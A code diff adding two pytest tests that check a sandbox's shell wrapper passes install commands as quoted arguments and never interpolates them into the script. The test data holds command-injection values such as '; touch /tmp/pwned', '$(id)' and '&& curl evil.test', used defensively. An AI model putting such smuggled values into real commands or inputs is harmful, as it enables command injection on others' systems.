@@ -144,6 +144,40 @@ def test_wrapper_exits_with_the_install_status():
     assert rc == 7
 
 
+def test_the_command_is_never_interpolated_into_the_wrapper_script():
+    """The wrapper runs the install through `/bin/sh -c`, which would be an injection surface
+    if the command were formatted into the script text. It is not: the script is a fixed string
+    using quoted `"$@"`, and the command arrives as separate argv entries after `$0`.
+
+    Pinned because the safe and unsafe versions look almost identical - switching `"$@"` to
+    `$*`, or building the script with an f-string over `command`, would make every token
+    shell-evaluated. Only the nonce (hex from `secrets.token_hex`) is ever interpolated."""
+    hostile = ["npm", "install", "; touch /tmp/pwned", "$(id)", "`id`", "&& curl evil.test"]
+    cmd = witness_command(hostile, NONCE)
+
+    script = cmd[2]
+    assert '"$@"' in script, "must expand the command as quoted positional args"
+    for token in hostile[2:]:
+        assert token not in script, f"{token!r} was interpolated into the shell script"
+    assert cmd[3] == "detonator-witness", "$0 must be a placeholder, not part of the command"
+    assert cmd[4:] == hostile, "the command must arrive as argv, untouched"
+
+
+@pytest.mark.skipif(not shutil.which("sh"), reason="needs a POSIX sh")
+def test_a_hostile_command_token_is_not_evaluated_by_the_wrapper(tmp_path):
+    """The same property, demonstrated by running it: a token that would be a shell command
+    if interpolated is passed to `echo` as a literal argument instead."""
+    marker = tmp_path / "pwned"
+    payload = f"; touch {marker}"
+    script = witness_command(["echo", payload], NONCE)[2]
+
+    done = subprocess.run([shutil.which("sh"), "-c", script, "w", "echo", payload],
+                          capture_output=True, text=True)  # fmt: skip
+
+    assert not marker.exists(), "the wrapper evaluated a command token as shell"
+    assert payload in done.stdout, "the token should reach echo as a literal argument"
+
+
 def test_docker_args_wrap_the_command_when_given_a_nonce():
     req = DetonateRequest(job_id="j", clone_url="https://github.com/o/r", head_sha="a" * 40)
     args = detonate.docker_run_args(req, detonate.Config(), "det-j", Path("/s"), nonce=NONCE)
